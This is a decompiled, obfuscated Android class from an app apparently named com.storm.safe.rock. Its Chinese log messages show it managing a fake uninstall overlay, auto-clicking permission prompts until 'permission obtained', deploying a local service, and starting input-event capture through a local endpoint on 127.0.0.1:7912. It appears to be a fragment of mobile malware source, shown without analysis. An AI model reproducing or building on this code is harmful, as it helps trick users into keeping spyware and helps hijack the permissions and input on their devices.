package p000;

import android.view.WindowManager;
import android.widget.ScrollView;
import com.storm.safe.rock.AbstractC0241a0;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.C0327b2;
import com.storm.safe.rock.service.modules.cipher.C0339a5;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.Pair;
import okio.Segment;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: p2 */
/* loaded from: classes2.dex */
public final /* synthetic */ class RunnableC1053p2 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f59138a0;

    public /* synthetic */ RunnableC1053p2(int i) {
        this.f59138a0 = i;
    }

    @Override // java.lang.Runnable
    public final void run() throws IOException {
        ScrollView scrollView;
        switch (this.f59138a0) {
            case 0:
                synchronized (AbstractC0315a0.f53029a4) {
                    AbstractC0315a0.f53028a3 = null;
                }
                AbstractC0315a0.m211541a3();
                return;
            case 1:
                AtomicBoolean atomicBoolean = AbstractC1095q3.f59371a1;
                try {
                    URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/startGetevent").openConnection();
                    t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                    HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
                    httpURLConnection.setConnectTimeout(5000);
                    httpURLConnection.setReadTimeout(5000);
                    InputStream inputStream = httpURLConnection.getInputStream();
                    t60.m214694b5(inputStream, "conn.inputStream");
                    String strM210590e1 = b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, AbstractC0577hd.f56650a0), Segment.SIZE));
                    httpURLConnection.disconnect();
                    JSONObject jSONObject = new JSONObject(strM210590e1);
                    if (jSONObject.optBoolean(PollingXHR.Request.EVENT_SUCCESS)) {
                        return;
                    }
                    jSONObject.optString("message");
                    atomicBoolean.set(false);
                    return;
                } catch (Exception unused) {
                    atomicBoolean.set(false);
                    return;
                }
            case 2:
                try {
                    if (cm0.f46152a2 && (scrollView = cm0.f46151a1) != null) {
                        WindowManager windowManager = cm0.f46150a0;
                        if (windowManager != null) {
                            windowManager.removeView(scrollView);
                        }
                        cm0.f46151a1 = null;
                        cm0.f46152a2 = false;
                        t60.m214714d6("PkgVerifyOverlay", "假卸载页面已隐藏");
                        return;
                    }
                    return;
                } catch (Exception e) {
                    t60.m214705c6("PkgVerifyOverlay", "隐藏失败", e);
                    return;
                }
            case 3:
                WindowManager windowManager2 = C0339a5.f53362a0;
                C0339a5.m211858a6();
                return;
            case 4:
                WindowManager windowManager3 = C0339a5.f53362a0;
                C0339a5.m211852a0();
                return;
            case 5:
                WindowManager windowManager4 = C0339a5.f53362a0;
                C0339a5.m211852a0();
                return;
            case 6:
                WindowManager windowManager5 = C0339a5.f53362a0;
                C0339a5.m211859a7(true);
                return;
            case 7:
                WindowManager windowManager6 = C0339a5.f53362a0;
                C0339a5.m211859a7(false);
                return;
            case 8:
                try {
                    C0327b2.m211696b0();
                    return;
                } catch (Exception e2) {
                    t60.m214705c6("WriteSettingsPerm", "★★★ 部署 local-service 异常 ★★★", e2);
                    return;
                }
            case 9:
                try {
                    C0327b2.m211696b0();
                    return;
                } catch (Exception e3) {
                    t60.m214705c6("WriteSettingsPerm", "★★★ 部署 local-service 异常 ★★★", e3);
                    return;
                }
            case 10:
                try {
                    iuzxujjtqev.m211207b9();
                    return;
                } catch (Exception e4) {
                    t60.m214705c6("iuzxujjtqev", "❌ Android 10弹框处理异常", e4);
                    return;
                }
            case oe0.DEFAULT_M /* 11 */:
                iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
                Integer num = AbstractC0241a0.f51907a1;
                if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) != null) {
                    t60.m214714d6("iuzxujjtqev", "✅ [权限] 策略1点击成功，权限已获得");
                    return;
                }
                return;
            default:
                iuzxujjtqev.C0254a0 c0254a02 = iuzxujjtqev.f51956e2;
                Integer num2 = AbstractC0241a0.f51907a1;
                if ((num2 != null ? new Pair(num2, AbstractC0241a0.f51908a2) : null) != null) {
                    t60.m214714d6("iuzxujjtqev", "✅ [权限] 策略2点击成功，权限已获得");
                    return;
                }
                return;
        }
    }

    public /* synthetic */ RunnableC1053p2(int i, Object obj) {
        this.f59138a0 = i;
    }
}
